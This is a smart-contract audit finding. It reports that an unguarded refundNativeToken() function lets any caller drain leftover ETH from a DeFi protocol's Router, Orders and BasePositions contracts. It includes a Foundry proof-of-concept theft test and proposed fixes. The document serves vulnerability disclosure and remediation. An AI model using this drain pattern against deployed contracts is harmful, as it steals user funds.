## Title
Unprotected `refundNativeToken()` Allows Theft of Accumulated ETH from Router, Orders, and BasePositions Contracts

## Summary
The `refundNativeToken()` function in `PayableMulticallable` drains the entire contract balance to `msg.sender` without verifying ownership of the funds. When users send excess ETH to Router, Orders, or BasePositions contracts (more than needed for their operations), the surplus remains in these contracts and can be stolen by any attacker calling `refundNativeToken()`.

## Impact
**Severity**: High

## Finding Description

**Location:** 
- `src/base/PayableMulticallable.sol` (vulnerable function) [1](#0-0) 

- `src/Router.sol` (inherits vulnerable function and has ETH accumulation issue) [2](#0-1) 

- `src/Orders.sol` (inherits vulnerable function) [3](#0-2) 

- `src/base/BasePositions.sol` (inherits vulnerable function) [4](#0-3) 

**Intended Logic:** 
The `refundNativeToken()` function is documented to "allow callers to recover ETH that was sent for transient payments but not fully consumed" when "exact payment amounts are difficult to calculate in advance." It's intended to refund leftover ETH to the original sender after their multicall operations complete.

**Actual Logic:** 
The function has no access control and sends the **entire contract balance** to `msg.sender` without verifying that the caller owns those funds. The Router's swap logic calculates the ETH amount to forward based on `params.amount()`, not `msg.value`, causing excess ETH to remain in the Router contract. [5](#0-4) 

**Exploitation Path:**

1. **Setup Phase**: Multiple honest users perform swaps via Router, each sending slightly more ETH than their swap requires:
   - User A calls `Router.swap{value: 100 ether}(...)` with `params.amount() = 80 ether`
   - Router forwards only 80 ETH to Core (based on calculation at lines 106-110)
   - 20 ETH remains stuck in Router contract
   - User B calls `Router.swap{value: 50 ether}(...)` with `params.amount() = 40 ether`  
   - Router forwards only 40 ETH to Core
   - 10 ETH more remains in Router
   - **Total accumulated: 30 ETH in Router contract**

2. **Attack Execution**: Attacker calls `Router.refundNativeToken()`
   - Function sends entire `address(this).balance` (30 ETH) to attacker
   - No verification that these funds belong to the attacker

3. **Loss Realization**: Users A and B lose their excess ETH permanently

4. **Same vulnerability applies to Orders and BasePositions** which also inherit from PayableMulticallable and have payable functions that may leave ETH in the contract.

**Security Property Broken:** 
Direct theft of user funds - violates the fundamental security assumption that users' assets should only be withdrawable by the rightful owner.

## Impact Explanation

- **Affected Assets**: Native ETH sent to Router, Orders, or BasePositions contracts by users who overpay for operations
- **Damage Severity**: 
  - Complete loss of all accumulated excess ETH in the contract
  - Any user can drain the balance at any time
  - Loss scales with protocol usage - more users = more accumulated excess ETH = larger theft opportunity
- **User Impact**: 
  - Any user who sends `msg.value > params.amount()` to Router
  - Any user who sends excess ETH for Orders operations
  - Any user who sends excess ETH for Positions deposits
  - Users may overpay intentionally (for gas efficiency in multicalls) or accidentally (frontend issues, slippage tolerance)

## Likelihood Explanation

- **Attacker Profile**: Any external address - no special permissions required
- **Preconditions**: 
  - At least one user has sent excess ETH to Router/Orders/BasePositions
  - No minimum threshold - even small amounts are profitable to steal
- **Execution Complexity**: Single transaction calling `refundNativeToken()` - trivial to execute
- **Frequency**: Can be exploited continuously - attacker can monitor contract balance and immediately drain any accumulated ETH

## Recommendation

**Option 1: Remove the function entirely** - The refund logic should be handled within the specific operation (swap/deposit/order) that created the excess, not as a separate unprotected function.

**Option 2: Track ownership of excess funds** - Implement a mapping to track which user's excess ETH remains in the contract:

```solidity
// In src/base/PayableMulticallable.sol:

// Add state variable
mapping(address => uint256) private _excessNativeToken;

// Modify refundNativeToken
function refundNativeToken() external payable {
    uint256 refundAmount = _excessNativeToken[msg.sender];
    if (refundAmount != 0) {
        _excessNativeToken[msg.sender] = 0;
        SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
    }
}

// In derived contracts (Router/Orders/BasePositions), after each operation:
// Track any remaining ETH as belonging to msg.sender
if (address(this).balance > 0) {
    _excessNativeToken[msg.sender] += address(this).balance;
}
```

**Option 3: Strict value matching** - Revert if `msg.value` doesn't exactly match the required amount:

```solidity
// In Router.handleLockData (single swap case):
// After calculating value (line 110), add:
require(msg.value == value, "ExcessValueNotAllowed");
```

**Recommended approach**: Option 1 (remove function) or Option 2 (track ownership) are safest. Option 3 reduces UX flexibility for multicalls.

## Proof of Concept

```solidity
// File: test/Exploit_RefundTheft.t.sol
// Run with: forge test --match-test test_StealAccumulatedETH -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";
import "../src/types/poolKey.sol";
import "../src/types/swapParameters.sol";

contract Exploit_RefundTheft is Test {
    Router router;
    Core core;
    address victimA = address(0x1111);
    address victimB = address(0x2222);
    address attacker = address(0x3333);
    
    function setUp() public {
        core = new Core();
        router = new Router(core);
        
        // Setup a basic ETH/Token pool
        // [Pool initialization code - omitted for brevity]
        
        // Fund victims
        vm.deal(victimA, 100 ether);
        vm.deal(victimB, 50 ether);
        vm.deal(attacker, 0); // Attacker starts with 0 ETH
    }
    
    function test_StealAccumulatedETH() public {
        // SETUP: Victims send excess ETH for swaps
        
        // Victim A: Sends 100 ETH but swap only needs 80 ETH
        vm.prank(victimA);
        SwapParameters memory params = createSwapParameters({
            _isToken1: false,
            _amount: int128(80 ether),
            _sqrtRatioLimit: SqrtRatio.wrap(0),
            _skipAhead: 0
        });
        router.swap{value: 100 ether}(poolKey, params, 0);
        
        // 20 ETH should remain in Router
        assertEq(address(router).balance, 20 ether, "VictimA excess not captured");
        
        // Victim B: Sends 50 ETH but swap only needs 40 ETH  
        vm.prank(victimB);
        params = createSwapParameters({
            _isToken1: false,
            _amount: int128(40 ether),
            _sqrtRatioLimit: SqrtRatio.wrap(0),
            _skipAhead: 0
        });
        router.swap{value: 50 ether}(poolKey, params, 0);
        
        // Total 30 ETH accumulated in Router
        assertEq(address(router).balance, 30 ether, "Total excess not accumulated");
        
        // EXPLOIT: Attacker steals all accumulated ETH
        vm.prank(attacker);
        router.refundNativeToken();
        
        // VERIFY: Attacker received all 30 ETH
        assertEq(attacker.balance, 30 ether, "Vulnerability confirmed: Attacker stole accumulated ETH");
        assertEq(address(router).balance, 0, "Router balance drained");
        
        // Victims cannot recover their excess ETH
        vm.prank(victimA);
        vm.expectRevert(); // No ETH left to refund
        router.refundNativeToken();
    }
}
```

## Notes

1. **Root Cause Analysis**: The vulnerability stems from two design issues:
   - `refundNativeToken()` lacks access control and operates on the entire balance
   - Router/Orders/BasePositions accept arbitrary `msg.value` but only forward calculated amounts
   
2. **Cross-Contract Impact**: All three contracts (Router, Orders, BasePositions) inherit from PayableMulticallable and are vulnerable:
   - Router: ETH accumulates when users overpay for swaps
   - Orders: ETH accumulates when users overpay for TWAMM order operations
   - BasePositions: ETH accumulates when users overpay for deposits

3. **FlashAccountant Debt Settlement Context**: The security question asks about "ETH from FlashAccountant debt settlements." While the FlashAccountant (Core contract) uses the `receive()` function to accept debt settlement payments [6](#0-5) , the Core contract does NOT inherit from PayableMulticallable and thus doesn't have the vulnerable `refundNativeToken()` function. The vulnerability is isolated to Router/Orders/BasePositions which act as intermediaries that forward ETH to Core.

4. **Why Refunds Don't Work**: The Router's refund logic at lines 134-142 only handles cases where the Core swap uses less than the forwarded value, not cases where users send more than the Router forwards to Core in the first place. [7](#0-6) 

5. **Multicall Amplification**: The multicall functionality makes this worse - users batching multiple operations with a single large `msg.value` are likely to have significant excess ETH accumulate.

### Citations

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/Router.sol (L52-52)
```text
contract Router is UsesCore, PayableMulticallable, BaseLocker {
```

**File:** src/Router.sol (L106-110)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );
```

**File:** src/Router.sol (L134-142)
```text
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
```

**File:** src/Orders.sol (L24-24)
```text
contract Orders is IOrders, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```

**File:** src/base/BasePositions.sol (L29-29)
```text
abstract contract BasePositions is IPositions, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```

**File:** src/base/FlashAccountant.sol (L384-393)
```text
    receive() external payable {
        uint256 id = _getLocker().id();

        // Note because we use msg.value here, this contract can never be multicallable, i.e. it should never expose the ability
        //      to delegatecall itself more than once in a single call
        unchecked {
            // We assume msg.value will never exceed type(uint128).max, so this should never cause an overflow/underflow of debt
            _accountDebt(id, NATIVE_TOKEN_ADDRESS, -int256(msg.value));
        }
    }
```
